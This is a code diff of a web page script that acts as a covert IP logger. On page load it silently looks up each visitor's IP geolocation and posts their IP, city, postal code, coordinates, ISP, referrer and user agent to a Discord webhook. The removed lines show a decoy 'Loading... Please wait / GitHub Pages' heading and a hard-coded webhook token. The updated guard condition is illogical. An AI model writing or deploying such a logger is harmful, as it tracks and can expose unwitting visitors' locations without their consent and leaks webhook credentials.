@@ -1,36 +1,31 @@
-<h1>Loading... Please wait / GitHub Pages</h1>
-This may take a second
 <script>
 window.addEventListener("load", async () => {
-  if (sessionStorage.getItem("visitLogged")) return;
-  sessionStorage.setItem("visitLogged", "true");
-
-  const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
+  const webhookURL = "PASTE_YOUR_WEBHOOK_HERE";
+  if (!webhookURL || webhookURL.includes("https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe")) return;
 
   try {
-    // Get detailed IP info
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
 
-    const visitData = {
-      content: "🌍 New Detailed Visit",
+    const payload = {
+      username: "IP Visitor Logger",
       embeds: [{
-        title: "Visitor IP Details",
+        title: "🌍 Visit Detected",
         color: 3447003,
         fields: [
-          { name: "IP", value: data.ip || "Unknown", inline: true },
+          { name: "IP Address", value: data.ip || "Unknown", inline: true },
           { name: "City", value: data.city || "Unknown", inline: true },
           { name: "Region", value: data.region || "Unknown", inline: true },
           { name: "Country", value: data.country_name || "Unknown", inline: true },
+          { name: "Postal", value: data.postal || "Unknown", inline: true },
           { name: "ISP / Org", value: data.org || "Unknown" },
           { name: "Timezone", value: data.timezone || "Unknown", inline: true },
-          { name: "Postal Code", value: data.postal || "Unknown", inline: true },
-          { name: "Page", value: window.location.href },
-          { name: "Referrer", value: document.referrer || "Direct Visit" }
+          { name: "Latitude", value: String(data.latitude || "Unknown"), inline: true },
+          { name: "Longitude", value: String(data.longitude || "Unknown"), inline: true },
+          { name: "Page URL", value: window.location.href },
+          { name: "Referrer", value: document.referrer || "Direct Visit" },
+          { name: "User Agent", value: navigator.userAgent.substring(0, 1000) }
         ],
-        footer: {
-          text: navigator.userAgent
-        },
         timestamp: new Date().toISOString()
       }]
     };
@@ -38,11 +33,11 @@ window.addEventListener("load", async () => {
     await fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(visitData)
+      body: JSON.stringify(payload)
     });
 
-  } catch (err) {
-    console.error("Error:", err);
+  } catch (error) {
+    console.error("IP logging failed:", error);
   }
 });
 </script>
